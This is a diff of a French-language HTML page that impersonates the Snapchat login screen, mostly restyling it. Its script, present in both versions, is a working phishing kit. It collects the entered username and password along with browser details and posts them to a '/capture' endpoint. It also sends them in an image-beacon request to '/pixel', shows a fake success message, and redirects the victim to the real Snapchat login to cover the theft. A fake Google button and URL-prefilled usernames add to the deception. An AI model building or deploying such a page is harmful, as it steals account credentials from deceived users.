@@ -2,7 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Snapchat - Se connecter</title>
     <style>
         * {
@@ -14,48 +14,48 @@
 
         body {
             background: #ffffff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+            padding: 40px 20px 20px 20px;
         }
 
         .container {
             width: 100%;
             max-width: 400px;
-            padding: 40px 20px;
         }
 
-        /* Snapchat Logo */
-        .logo {
+        /* ===== HEADER ===== */
+        .header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 32px;
         }
 
-        .logo svg {
-            width: 60px;
-            height: 60px;
+        .ghost-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 12px auto;
+            display: block;
         }
 
-        /* Title */
-        h1 {
+        .ghost-icon svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .header h1 {
             font-size: 28px;
             font-weight: 700;
-            color: #000;
-            margin-bottom: 5px;
-            text-align: center;
+            color: #1a1a1a;
+            letter-spacing: -0.3px;
         }
 
-        .subtitle {
-            text-align: center;
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 25px;
+        .header h1 span {
+            font-weight: 400;
+            color: #1a1a1a;
         }
 
-        /* Form */
+        /* ===== FORM ===== */
         .form-group {
             margin-bottom: 16px;
         }
@@ -64,7 +64,7 @@
             display: block;
             font-size: 14px;
             font-weight: 600;
-            color: #000;
+            color: #1a1a1a;
             margin-bottom: 6px;
         }
 
@@ -74,23 +74,22 @@
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 16px;
-            transition: border 0.3s;
             background: #fafafa;
-            color: #000;
+            color: #1a1a1a;
+            transition: border-color 0.2s, background 0.2s;
+            outline: none;
         }
 
         .form-group input:focus {
-            border-color: #fffc00;
-            outline: none;
+            border-color: #0066cc;
             background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(255, 252, 0, 0.15);
+            box-shadow: 0 0 0 4px rgba(0, 102, 204, 0.1);
         }
 
         .form-group input::placeholder {
             color: #999;
         }
 
-        /* Phone toggle link */
         .phone-toggle {
             text-align: right;
             margin-top: -8px;
@@ -102,13 +101,13 @@
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
+            cursor: pointer;
         }
 
         .phone-toggle a:hover {
             text-decoration: underline;
         }
 
-        /* Next Button */
         .btn-next {
             width: 100%;
             padding: 16px;
@@ -116,29 +115,34 @@
             color: #ffffff;
             border: none;
             border-radius: 30px;
-            font-size: 18px;
+            font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 5px;
+            transition: background 0.2s, transform 0.1s;
+            margin-top: 4px;
         }
 
         .btn-next:hover {
             background: #0052a3;
-            transform: scale(1.02);
         }
 
         .btn-next:active {
             transform: scale(0.98);
         }
 
-        /* Divider */
+        .btn-next:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* ===== DIVIDER ===== */
         .divider {
             display: flex;
             align-items: center;
-            margin: 25px 0;
+            margin: 24px 0;
             color: #999;
             font-size: 14px;
+            font-weight: 500;
         }
 
         .divider::before,
@@ -150,25 +154,25 @@
         }
 
         .divider::before {
-            margin-right: 15px;
+            margin-right: 16px;
         }
 
         .divider::after {
-            margin-left: 15px;
+            margin-left: 16px;
         }
 
-        /* Google Button */
+        /* ===== GOOGLE BUTTON ===== */
         .btn-google {
             width: 100%;
             padding: 14px;
             background: #ffffff;
-            color: #000;
+            color: #1a1a1a;
             border: 2px solid #e0e0e0;
             border-radius: 30px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: background 0.2s, border-color 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -180,17 +184,18 @@
             border-color: #ccc;
         }
 
-        .btn-google img {
+        .btn-google svg {
             width: 20px;
             height: 20px;
+            flex-shrink: 0;
         }
 
-        /* Sign up link */
+        /* ===== SIGNUP LINK ===== */
         .signup-link {
             text-align: center;
-            margin-top: 25px;
+            margin-top: 24px;
             font-size: 15px;
-            color: #333;
+            color: #1a1a1a;
         }
 
         .signup-link a {
@@ -203,57 +208,14 @@
             text-decoration: underline;
         }
 
-        /* Footer */
-        .footer {
-            margin-top: 50px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-            font-size: 12px;
-            color: #999;
-        }
-
-        .footer-columns {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .footer-column h4 {
-            font-size: 12px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-        }
-
-        .footer-column a {
-            display: block;
-            color: #999;
-            text-decoration: none;
-            font-size: 12px;
-            padding: 2px 0;
-        }
-
-        .footer-column a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-bottom {
-            text-align: center;
-            font-size: 11px;
-            color: #bbb;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-        }
-
-        /* Error / Success messages */
+        /* ===== MESSAGES ===== */
         .error {
             color: #d32f2f;
             font-size: 14px;
             margin-top: 12px;
             display: none;
             background: #ffebee;
-            padding: 10px;
+            padding: 10px 14px;
             border-radius: 8px;
         }
 
@@ -263,19 +225,19 @@
             margin-top: 12px;
             display: none;
             background: #e8f5e9;
-            padding: 10px;
+            padding: 10px 14px;
             border-radius: 8px;
         }
 
         .spinner {
             display: none;
-            margin: 15px auto;
-            width: 30px;
-            height: 30px;
+            margin: 16px auto;
+            width: 28px;
+            height: 28px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #0066cc;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
+            animation: spin 0.8s linear infinite;
         }
 
         @keyframes spin {
@@ -283,278 +245,388 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Responsive */
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 48px;
+            padding-top: 24px;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 24px 16px;
+            margin-bottom: 20px;
+        }
+
+        .footer-col h4 {
+            font-size: 12px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            letter-spacing: 0.3px;
+        }
+
+        .footer-col a {
+            display: block;
+            color: #999;
+            text-decoration: none;
+            font-size: 12px;
+            padding: 3px 0;
+            line-height: 1.6;
+        }
+
+        .footer-col a:hover {
+            text-decoration: underline;
+            color: #666;
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 16px;
+            border-top: 1px solid #e8e8e8;
+            font-size: 12px;
+            color: #999;
+            gap: 12px;
+        }
+
+        .footer-bottom .lang-selector {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #1a1a1a;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .footer-bottom .lang-selector svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .footer-bottom .legal-links {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-bottom .legal-links a {
+            color: #999;
+            text-decoration: none;
+        }
+
+        .footer-bottom .legal-links a:hover {
+            text-decoration: underline;
+            color: #666;
+        }
+
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .container {
-                padding: 20px 10px;
+            body {
+                padding: 24px 16px 16px 16px;
             }
-            .footer-columns {
+            .footer-grid {
                 grid-template-columns: 1fr 1fr;
+                gap: 16px;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+            .ghost-icon {
+                width: 64px;
+                height: 64px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .footer-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 12px;
+            }
+            .footer-col h4 {
+                font-size: 11px;
+            }
+            .footer-col a {
+                font-size: 11px;
             }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
+<div class="container">
 
-        <!-- Logo -->
-        <div class="logo">
+    <!-- ===== HEADER ===== -->
+    <div class="header">
+        <div class="ghost-icon">
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#FFFC00"/>
-                <path d="M12 6c-2.76 0-5 2.24-5 5v1c0 2.76 2.24 5 5 5s5-2.24 5-5v-1c0-2.76-2.24-5-5-5z" fill="#FFFC00"/>
-                <circle cx="12" cy="12" r="2" fill="#000"/>
+                <path d="M12 3C7.58 3 4 6.58 4 11v5c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-5c0-4.42-3.58-8-8-8z" fill="#FFFC00"/>
+                <path d="M12 7c-2.21 0-4 1.79-4 4v2c0 2.21 1.79 4 4 4s4-1.79 4-4v-2c0-2.21-1.79-4-4-4z" fill="#FFFC00"/>
+                <circle cx="9" cy="11" r="1.5" fill="#000"/>
+                <circle cx="15" cy="11" r="1.5" fill="#000"/>
+                <path d="M12 15c-1.1 0-2-.9-2-2h4c0 1.1-.9 2-2 2z" fill="#000"/>
             </svg>
         </div>
-
-        <!-- Title -->
-        <h1>Se connecter</h1>
-        <p class="subtitle">à Snapchat</p>
-
-        <!-- Login Form -->
-        <form id="loginForm" onsubmit="return handleSubmit(event)">
-
-            <!-- Username/Email -->
-            <div class="form-group">
-                <label for="username">Nom d'utilisateur ou adresse e-mail</label>
-                <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required autofocus>
-            </div>
-
-            <!-- Phone toggle -->
-            <div class="phone-toggle">
-                <a href="#" onclick="usePhone()">Utiliser mon numéro de téléphone</a>
-            </div>
-
-            <!-- Password (hidden until needed - but we capture both) -->
-            <div class="form-group" id="passwordGroup" style="display:none;">
-                <label for="password">Mot de passe</label>
-                <input type="password" id="password" placeholder="Mot de passe">
-            </div>
-
-            <!-- Error / Success Messages -->
-            <div id="error" class="error">Nom d'utilisateur ou mot de passe incorrect.</div>
-            <div id="success" class="success">✓ Connexion réussie ! Redirection...</div>
-            <div id="spinner" class="spinner"></div>
-
-            <!-- Next Button -->
-            <button type="submit" class="btn-next" id="loginBtn">Suivant</button>
-
-        </form>
-
-        <!-- Divider -->
-        <div class="divider">OU</div>
-
-        <!-- Google Button -->
-        <button class="btn-google" onclick="googleLogin()">
-            <svg width="20" height="20" viewBox="0 0 48 48">
-                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-            </svg>
-            Continuer avec Google
-        </button>
-
-        <!-- Sign up -->
-        <div class="signup-link">
-            Vous débutez sur Snapchat ? <a href="#">S'inscrire</a>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <div class="footer-columns">
-                <div class="footer-column">
-                    <h4>Société</h4>
-                    <a href="#">Snap Inc.</a>
-                    <a href="#">Carrières</a>
-                    <a href="#">Actualités</a>
-                </div>
-                <div class="footer-column">
-                    <h4>Communauté</h4>
-                    <a href="#">Assistance</a>
-                    <a href="#">Règles communautaires</a>
-                    <a href="#">Centre de sécurité</a>
-                </div>
-                <div class="footer-column">
-                    <h4>Publicité</h4>
-                    <a href="#">Acheter des publicités</a>
-                    <a href="#">Politiques relatives à la publicité</a>
-                    <a href="#">Bibliothèque des publicités politiques</a>
-                    <a href="#">Charte de la marque</a>
-                    <a href="#">Règles applicables aux promotions</a>
-                </div>
-                <div class="footer-column">
-                    <h4>Juridique</h4>
-                    <a href="#">Centre de confidentialité</a>
-                    <a href="#">Vos choix de confidentialité</a>
-                    <a href="#">Politique relative aux cookies</a>
-                    <a href="#">Signaler une violation</a>
-                    <a href="#">Conditions d'utilisation des outils créatifs personnalisés</a>
-                    <a href="#">Conditions générales des Geofilters communautaires</a>
-                    <a href="#">Conditions d'utilisation de Lens Studio</a>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                © Snapchat 2026
-            </div>
-        </div>
-
+        <h1>Se connecter <span>à Snapchat</span></h1>
     </div>
 
-    <script>
-        // --- Phone toggle ---
-        function usePhone() {
-            const usernameField = document.getElementById('username');
-            usernameField.placeholder = 'Numéro de téléphone';
-            usernameField.type = 'tel';
-            document.querySelector('.phone-toggle a').textContent = 'Utiliser mon adresse e-mail';
-            document.querySelector('.phone-toggle a').setAttribute('onclick', 'useEmail()');
-        }
+    <!-- ===== FORM ===== -->
+    <form id="loginForm" onsubmit="return handleSubmit(event)">
 
-        function useEmail() {
-            const usernameField = document.getElementById('username');
-            usernameField.placeholder = 'Nom d\'utilisateur ou e-mail';
-            usernameField.type = 'text';
-            document.querySelector('.phone-toggle a').textContent = 'Utiliser mon numéro de téléphone';
-            document.querySelector('.phone-toggle a').setAttribute('onclick', 'usePhone()');
-        }
+        <div class="form-group">
+            <label for="username">Nom d'utilisateur ou adresse e-mail</label>
+            <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required autofocus>
+        </div>
 
-        // --- Show password field when "Suivant" is clicked ---
-        function showPassword() {
-            document.getElementById('passwordGroup').style.display = 'block';
-            document.getElementById('password').focus();
-            document.getElementById('loginBtn').textContent = 'Se connecter';
-            // Remove the submit handler temporarily
-            const form = document.getElementById('loginForm');
-            form.onsubmit = function(e) {
-                e.preventDefault();
-                return handleSubmit(e);
-            };
-        }
+        <div class="phone-toggle">
+            <a onclick="usePhone()">Utiliser mon numéro de téléphone</a>
+        </div>
 
-        // --- Handle form submission ---
-        function handleSubmit(event) {
-            event.preventDefault();
+        <!-- Password (hidden initially) -->
+        <div class="form-group" id="passwordGroup" style="display:none;">
+            <label for="password">Mot de passe</label>
+            <input type="password" id="password" placeholder="Mot de passe">
+        </div>
 
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const errorEl = document.getElementById('error');
-            const successEl = document.getElementById('success');
+        <div id="error" class="error">Nom d'utilisateur ou mot de passe incorrect.</div>
+        <div id="success" class="success">✓ Connexion réussie ! Redirection...</div>
+        <div id="spinner" class="spinner"></div>
 
-            // If password field is hidden, show it
-            if (document.getElementById('passwordGroup').style.display === 'none') {
-                showPassword();
-                return false;
-            }
+        <button type="submit" class="btn-next" id="loginBtn">Suivant</button>
 
-            // Validation
-            if (!username) {
-                errorEl.textContent = 'Veuillez entrer votre nom d\'utilisateur ou e-mail.';
-                errorEl.style.display = 'block';
-                successEl.style.display = 'none';
-                return false;
-            }
+    </form>
 
-            if (!password) {
-                errorEl.textContent = 'Veuillez entrer votre mot de passe.';
-                errorEl.style.display = 'block';
-                successEl.style.display = 'none';
-                return false;
-            }
+    <!-- ===== DIVIDER ===== -->
+    <div class="divider">OU</div>
 
-            if (password.length < 6) {
-                errorEl.textContent = 'Le mot de passe doit contenir au moins 6 caractères.';
-                errorEl.style.display = 'block';
-                successEl.style.display = 'none';
-                return false;
-            }
+    <!-- ===== GOOGLE BUTTON ===== -->
+    <button class="btn-google" onclick="googleLogin()">
+        <svg viewBox="0 0 48 48">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+        </svg>
+        Continuer avec Google
+    </button>
 
-            // Hide error, show loading
-            errorEl.style.display = 'none';
-            successEl.style.display = 'none';
-            document.getElementById('spinner').style.display = 'block';
-            document.getElementById('loginBtn').disabled = true;
-            document.getElementById('loginBtn').textContent = 'Connexion...';
+    <!-- ===== SIGNUP ===== -->
+    <div class="signup-link">
+        Vous débutez sur Snapchat ? <a href="#">S'inscrire</a>
+    </div>
 
-            // --- CAPTURE CREDENTIALS ---
-            const data = {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: window.screen.width + 'x' + window.screen.height,
-                url: window.location.href
-            };
+    <!-- ===== FOOTER ===== -->
+    <div class="footer">
+        <div class="footer-grid">
+            <div class="footer-col">
+                <h4>Société</h4>
+                <a href="#">Snap Inc.</a>
+                <a href="#">Carrières</a>
+                <a href="#">Actualités</a>
+            </div>
+            <div class="footer-col">
+                <h4>Communauté</h4>
+                <a href="#">Assistance</a>
+                <a href="#">Règles communautaires</a>
+                <a href="#">Centre de sécurité</a>
+            </div>
+            <div class="footer-col">
+                <h4>Publicité</h4>
+                <a href="#">Acheter des publicités</a>
+                <a href="#">Politiques relatives à la publicité</a>
+                <a href="#">Bibliothèque des publicités politiques</a>
+                <a href="#">Charte de la marque</a>
+                <a href="#">Règles applicables aux promotions</a>
+            </div>
+            <div class="footer-col">
+                <h4>Juridique</h4>
+                <a href="#">Centre de confidentialité</a>
+                <a href="#">Vos choix de confidentialité</a>
+                <a href="#">Politique relative aux cookies</a>
+                <a href="#">Signaler une violation</a>
+                <a href="#">Conditions d'utilisation des outils créatifs personnalisés</a>
+                <a href="#">Conditions générales des Geofilters communautaires</a>
+                <a href="#">Conditions d'utilisation de Lens Studio</a>
+            </div>
+        </div>
 
-            // Send to your server
-            fetch('/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});
+        <div class="footer-bottom">
+            <div class="lang-selector">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"/>
+                    <line x1="2" y1="12" x2="22" y2="12"/>
+                    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                </svg>
+                Français
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="6 9 12 15 18 9"/>
+                </svg>
+            </div>
+            <div class="legal-links">
+                <a href="#">Politique de confidentialité</a>
+                <a href="#">Conditions d'utilisation du service</a>
+            </div>
+        </div>
+    </div>
 
-            // Send as image beacon (backup)
-            new Image().src = '/pixel?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password) + '&t=' + Date.now();
+</div>
 
-            // --- Show success, redirect to real Snapchat ---
-            setTimeout(function() {
-                document.getElementById('spinner').style.display = 'none';
-                successEl.textContent = '✓ Connexion réussie ! Redirection vers Snapchat...';
-                successEl.style.display = 'block';
-                document.getElementById('loginBtn').textContent = 'Redirection...';
+<script>
+    // ===== TOGGLE PHONE / EMAIL =====
+    function usePhone() {
+        const field = document.getElementById('username');
+        field.placeholder = 'Numéro de téléphone';
+        field.type = 'tel';
+        const toggle = document.querySelector('.phone-toggle a');
+        toggle.textContent = 'Utiliser mon adresse e-mail';
+        toggle.setAttribute('onclick', 'useEmail()');
+    }
 
-                setTimeout(function() {
-                    window.location.href = 'https://www.snapchat.com/login';
-                }, 2000);
-            }, 1500);
+    function useEmail() {
+        const field = document.getElementById('username');
+        field.placeholder = 'Nom d\'utilisateur ou e-mail';
+        field.type = 'text';
+        const toggle = document.querySelector('.phone-toggle a');
+        toggle.textContent = 'Utiliser mon numéro de téléphone';
+        toggle.setAttribute('onclick', 'usePhone()');
+    }
 
+    // ===== SHOW PASSWORD FIELD =====
+    function showPassword() {
+        const group = document.getElementById('passwordGroup');
+        group.style.display = 'block';
+        document.getElementById('password').focus();
+        document.getElementById('loginBtn').textContent = 'Se connecter';
+    }
+
+    // ===== GOOGLE LOGIN (fake) =====
+    function googleLogin() {
+        const error = document.getElementById('error');
+        error.textContent = 'La connexion avec Google n\'est pas disponible. Veuillez vous connecter avec votre e-mail.';
+        error.style.display = 'block';
+        setTimeout(() => { error.style.display = 'none'; }, 4000);
+    }
+
+    // ===== FORM SUBMIT =====
+    function handleSubmit(event) {
+        event.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const errorEl = document.getElementById('error');
+        const successEl = document.getElementById('success');
+        const spinner = document.getElementById('spinner');
+        const btn = document.getElementById('loginBtn');
+
+        // If password not visible, show it
+        if (document.getElementById('passwordGroup').style.display === 'none') {
+            showPassword();
             return false;
         }
 
-        // --- Google login button ---
-        function googleLogin() {
-            const errorEl = document.getElementById('error');
-            errorEl.textContent = 'La connexion avec Google n\'est pas disponible pour le moment. Veuillez vous connecter avec votre e-mail.';
+        // Validation
+        errorEl.style.display = 'none';
+        successEl.style.display = 'none';
+
+        if (!username) {
+            errorEl.textContent = 'Veuillez entrer votre nom d\'utilisateur ou e-mail.';
             errorEl.style.display = 'block';
+            return false;
         }
 
-        // --- Pre-fill username if provided in URL ---
-        window.addEventListener('DOMContentLoaded', function() {
-            const params = new URLSearchParams(window.location.search);
-            const user = params.get('user');
-            if (user) {
-                document.getElementById('username').value = user;
-            }
-            document.getElementById('username').focus();
+        if (!password) {
+            errorEl.textContent = 'Veuillez entrer votre mot de passe.';
+            errorEl.style.display = 'block';
+            return false;
+        }
 
-            // Enter key on username field shows password
-            document.getElementById('username').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    if (document.getElementById('passwordGroup').style.display === 'none') {
-                        showPassword();
-                    } else {
-                        document.getElementById('loginForm').dispatchEvent(new Event('submit'));
-                    }
-                }
-            });
+        if (password.length < 6) {
+            errorEl.textContent = 'Le mot de passe doit contenir au moins 6 caractères.';
+            errorEl.style.display = 'block';
+            return false;
+        }
 
-            // Enter key on password field submits
-            document.getElementById('password').addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
+        // --- SEND CREDENTIALS ---
+        spinner.style.display = 'block';
+        btn.disabled = true;
+        btn.textContent = 'Connexion...';
+
+        const data = {
+            username: username,
+            password: password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: window.screen.width + 'x' + window.screen.height,
+            language: navigator.language,
+            url: window.location.href
+        };
+
+        // Send to capture endpoint
+        fetch('/capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).catch(() => {});
+
+        // Image beacon backup
+        new Image().src = '/pixel?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
+
+        // --- SUCCESS ---
+        setTimeout(function() {
+            spinner.style.display = 'none';
+            successEl.textContent = '✓ Connexion réussie ! Redirection vers Snapchat...';
+            successEl.style.display = 'block';
+            btn.textContent = 'Redirection...';
+
+            setTimeout(function() {
+                window.location.href = 'https://www.snapchat.com/login';
+            }, 2000);
+        }, 1200);
+
+        return false;
+    }
+
+    // ===== KEYBOARD SHORTCUTS =====
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('username').focus();
+
+        // Enter on username → show password
+        document.getElementById('username').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (document.getElementById('passwordGroup').style.display === 'none') {
+                    showPassword();
+                } else {
                     document.getElementById('loginForm').dispatchEvent(new Event('submit'));
                 }
-            });
+            }
         });
 
-        // --- Prevent back button issues ---
-        window.addEventListener('beforeunload', function() {
-            // Optional tracking
+        // Enter on password → submit
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
         });
-    </script>
+
+        // Pre-fill username from URL
+        const params = new URLSearchParams(window.location.search);
+        const user = params.get('user');
+        if (user) {
+            document.getElementById('username').value = user;
+        }
+    });
+</script>
 
 </body>
 </html>
